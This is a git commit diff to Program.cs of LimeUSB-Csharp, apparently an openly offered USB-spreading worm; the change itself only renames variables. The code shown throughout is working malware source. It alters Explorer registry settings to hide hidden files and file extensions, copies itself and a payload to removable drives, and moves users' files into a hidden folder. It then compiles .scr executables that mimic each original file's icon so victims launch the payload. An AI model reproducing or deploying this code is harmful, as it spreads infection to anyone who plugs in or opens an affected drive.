16f40f6be26599539d38d99c3f1e0e717ea87788
NYAN CAT <NYANxCAT@pm.me>
2019-04-25 04:57:45 -0700

    Update Program.cs

--- LimeUSB-Csharp/Program.cs
+++ LimeUSB-Csharp/Program.cs
@@ -9,6 +9,7 @@ using Microsoft.Win32;
 using System.Drawing;
 using Microsoft.CSharp;
 using System.CodeDom.Compiler;
+using Microsoft.VisualBasic.Devices;
 
 //
 //       │ Author     : NYAN CAT
@@ -31,29 +32,29 @@ namespace LimeUSB_Csharp
         {
             ExplorerOptions();
 
-            foreach (DriveInfo USB in DriveInfo.GetDrives())
+            foreach (DriveInfo usb in DriveInfo.GetDrives())
             {
                 try
                 {
-                    if (USB.DriveType == DriveType.Removable && USB.IsReady)
+                    if (usb.DriveType == DriveType.Removable && usb.IsReady)
                     {
-                        if (!Directory.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory))
+                        if (!Directory.Exists(usb.RootDirectory.ToString() + Settings.WorkDirectory))
                         {
-                            Directory.CreateDirectory(USB.RootDirectory.ToString() + Settings.WorkDirectory);
-                            File.SetAttributes(USB.RootDirectory.ToString() + Settings.WorkDirectory, FileAttributes.System | FileAttributes.Hidden);
+                            Directory.CreateDirectory(usb.RootDirectory.ToString() + Settings.WorkDirectory);
+                            File.SetAttributes(usb.RootDirectory.ToString() + Settings.WorkDirectory, FileAttributes.System | FileAttributes.Hidden);
                         }
 
-                        if (!Directory.Exists((USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.IconsDirectory)))
-                            Directory.CreateDirectory((USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.IconsDirectory));
+                        if (!Directory.Exists((usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.IconsDirectory)))
+                            Directory.CreateDirectory((usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.IconsDirectory));
 
-                        if (!File.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile))
-                            File.Copy(Application.ExecutablePath, USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile);
+                        if (!File.Exists(usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile))
+                            File.Copy(Application.ExecutablePath, usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile);
 
-                        if (!File.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.PayloadFile))
-                            File.WriteAllBytes(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.PayloadFile,Properties.Resources.Payload);
+                        if (!File.Exists(usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.PayloadFile))
+                            File.WriteAllBytes(usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.PayloadFile, Properties.Resources.Payload);
 
-                        CreteDirectory(USB.RootDirectory.ToString());
-                        InfectFiles(USB.RootDirectory.ToString());
+                        CreteDirectory(usb.RootDirectory.ToString());
+                        InfectFiles(usb.RootDirectory.ToString());
                     }
                 }
                 catch (Exception ex)
@@ -65,24 +66,24 @@ namespace LimeUSB_Csharp
 
         public static void ExplorerOptions()
         {
-            RegistryKey Key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
-            if (Key.GetValue("Hidden") != (object)2)
-                Key.SetValue("Hidden", 2);
-            if (Key.GetValue("HideFileExt") != (object)1)
-                Key.SetValue("HideFileExt", 1);
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
+            if (key.GetValue("Hidden") != (object)2)
+                key.SetValue("Hidden", 2);
+            if (key.GetValue("HideFileExt") != (object)1)
+                key.SetValue("HideFileExt", 1);
         }
 
-        public static void InfectFiles(string Path)
+        public static void InfectFiles(string path)
         {
-            foreach (var File in Directory.GetFiles(Path))
+            foreach (var file in Directory.GetFiles(path))
             {
                 try
                 {
-                    if (CheckIfInfected(File))
+                    if (CheckIfInfected(file))
                     {
-                        ChangeIcon(File);
-                        System.IO.File.Move(File, File.Insert(3, Settings.WorkDirectory + "\\"));
-                        CompileFile(File);
+                        ChangeIcon(file);
+                        File.Move(file, file.Insert(3, Settings.WorkDirectory + "\\"));
+                        CompileFile(file);
                     }
                 }
                 catch (Exception ex)
@@ -91,24 +92,24 @@ namespace LimeUSB_Csharp
                 }
             }
 
-            foreach (var Directory in System.IO.Directory.GetDirectories(Path))
+            foreach (var directory in Directory.GetDirectories(path))
             {
-                if (!Directory.Contains(Settings.WorkDirectory))
-                    InfectFiles(Directory);
+                if (!directory.Contains(Settings.WorkDirectory))
+                    InfectFiles(directory);
             }
         }
 
-        public static void CreteDirectory(string USB_Directory)
+        public static void CreteDirectory(string usbDirectory)
         {
-            foreach (var Directory in System.IO.Directory.GetDirectories(USB_Directory))
+            foreach (var directory in Directory.GetDirectories(usbDirectory))
             {
                 try
                 {
-                    if (!Directory.Contains(Settings.WorkDirectory))
+                    if (!directory.Contains(Settings.WorkDirectory))
                     {
-                        if (!System.IO.Directory.Exists(Directory.Insert(3, Settings.WorkDirectory + "\\")))
-                            System.IO.Directory.CreateDirectory(Directory.Insert(3, Settings.WorkDirectory + "\\"));
-                        CreteDirectory(Directory);
+                        if (!Directory.Exists(directory.Insert(3, Settings.WorkDirectory + "\\")))
+                            Directory.CreateDirectory(directory.Insert(3, Settings.WorkDirectory + "\\"));
+                        CreteDirectory(directory);
                     }
                 }
                 catch
@@ -117,12 +118,12 @@ namespace LimeUSB_Csharp
             }
         }
 
-        public static bool CheckIfInfected(string File)
+        public static bool CheckIfInfected(string file)
         {
             try
             {
-                FileVersionInfo Info = FileVersionInfo.GetVersionInfo(File);
-                if (Info.LegalTrademarks == Settings.InfectedTrademark)
+                FileVersionInfo info = FileVersionInfo.GetVersionInfo(file);
+                if (info.LegalTrademarks == Settings.InfectedTrademark)
                     return false;
                 else
                     return true;
@@ -133,54 +134,54 @@ namespace LimeUSB_Csharp
             }
         }
 
-        public static void ChangeIcon(string File)
+        public static void ChangeIcon(string file)
         {
             try
             {
-                Icon FileIcon = Icon.ExtractAssociatedIcon(File);
-                MultiIcon MultiIcon = new MultiIcon();
-                SingleIcon SingleIcon = MultiIcon.Add(Path.GetFileName(File));
-                SingleIcon.CreateFrom(FileIcon.ToBitmap(), IconOutputFormat.Vista);
-                SingleIcon.Save(Path.GetPathRoot(File) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(File.Replace(" ", null)) + ".ico");
+                Icon fileIcon = Icon.ExtractAssociatedIcon(file);
+                MultiIcon multiIcon = new MultiIcon();
+                SingleIcon singleIcon = multiIcon.Add(Path.GetFileName(file));
+                singleIcon.CreateFrom(fileIcon.ToBitmap(), IconOutputFormat.Vista);
+                singleIcon.Save(Path.GetPathRoot(file) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(file.Replace(" ", null)) + ".ico");
             }
             catch { }
         }
 
-        public static void CompileFile(string InfectedFile)
+        public static void CompileFile(string infectedFile)
         {
             try
             {
-                string Source = Properties.Resources.Source;
-                Source = Source.Replace("%Payload%", Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\\" + Settings.PayloadFile);
-                Source = Source.Replace("%File%", InfectedFile.Insert(3, Settings.WorkDirectory + "\\"));
-                Source = Source.Replace("%USB%", Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile);
-                Source = Source.Replace("%Lime%", Settings.InfectedTrademark);
-                Source = Source.Replace("%LimeUSBModule%", Randomz(new Random().Next(6, 12)));
-                Source = Source.Replace("%Guid%", Guid.NewGuid().ToString());
+                string source = Properties.Resources.Source;
+                source = source.Replace("%Payload%", Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.PayloadFile);
+                source = source.Replace("%File%", infectedFile.Insert(3, Settings.WorkDirectory + "\\"));
+                source = source.Replace("%USB%", Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile);
+                source = source.Replace("%Lime%", Settings.InfectedTrademark);
+                source = source.Replace("%LimeUSBModule%", Randomz(new Random().Next(6, 12)));
+                source = source.Replace("%Guid%", Guid.NewGuid().ToString());
 
-                CompilerParameters CParams = new CompilerParameters();
-                Dictionary<string, string> ProviderOptions = new Dictionary<string, string>();
-                ProviderOptions.Add("CompilerVersion", GetOS());
+                CompilerParameters cParams = new CompilerParameters();
+                Dictionary<string, string> providerOptions = new Dictionary<string, string>();
+                providerOptions.Add("CompilerVersion", GetOS());
 
                 string options = "/target:winexe /platform:x86 /optimize+";
-                if (File.Exists(Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(InfectedFile.Replace(" ", null)) + ".ico"))
-                    options += " /win32icon:\"" + Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(InfectedFile.Replace(" ", null)) + ".ico" + "\"";
-                CParams.GenerateExecutable = true;
-                CParams.OutputAssembly = InfectedFile + ".scr";
-                CParams.CompilerOptions = options;
-                CParams.TreatWarningsAsErrors = false;
-                CParams.IncludeDebugInformation = false;
-                CParams.ReferencedAssemblies.Add("System.dll");
+                if (File.Exists(Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico"))
+                    options += " /win32icon:\"" + Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico" + "\"";
+                cParams.GenerateExecutable = true;
+                cParams.OutputAssembly = infectedFile + ".scr";
+                cParams.CompilerOptions = options;
+                cParams.TreatWarningsAsErrors = false;
+                cParams.IncludeDebugInformation = false;
+                cParams.ReferencedAssemblies.Add("System.dll");
 
-                CompilerResults Results = new CSharpCodeProvider(ProviderOptions).CompileAssemblyFromSource(CParams, Source);
+                CompilerResults results = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(cParams, source);
 
-                //if (Results.Errors.Count > 0)
+                //if (results.Errors.Count > 0)
                 //{
                 //    MessageBox.Show(string.Format("The compiler has encountered {0} errors",
-                //         Results.Errors.Count), "Errors while compiling", MessageBoxButtons.OK,
+                //         results.Errors.Count), "Errors while compiling", MessageBoxButtons.OK,
                 //         MessageBoxIcon.Error);
 
-                //    foreach (CompilerError Err in Results.Errors)
+                //    foreach (CompilerError Err in results.Errors)
                 //    {
                 //        MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", Err.ErrorText,
                 //            Err.Line, Err.Column, Err.FileName), "Error",
@@ -197,8 +198,8 @@ namespace LimeUSB_Csharp
 
         public static string GetOS()
         {
-            var OS = new Microsoft.VisualBasic.Devices.ComputerInfo();
-            if (OS.OSFullName.Contains("7"))
+            var os = new ComputerInfo();
+            if (os.OSFullName.Contains("7"))
                 return "v2.0";
             else
                 return "v4.0";
@@ -206,17 +207,17 @@ namespace LimeUSB_Csharp
 
         public static string Randomz(int L)
         {
-                string validchars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-                StringBuilder sb = new StringBuilder();
-                Random rand = new Random();
-                for (int i = 1; i <= L; i++)
-                {
-                    int idx = rand.Next(0, validchars.Length);
-                    char randomChar = validchars[idx];
-                    sb.Append(randomChar);
-                }
-                var randomString = sb.ToString();
-                return randomString;
+            string validchars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            StringBuilder sb = new StringBuilder();
+            Random rand = new Random();
+            for (int i = 1; i <= L; i++)
+            {
+                int idx = rand.Next(0, validchars.Length);
+                char randomChar = validchars[idx];
+                sb.Append(randomChar);
+            }
+            var randomString = sb.ToString();
+            return randomString;
         }
     }
 
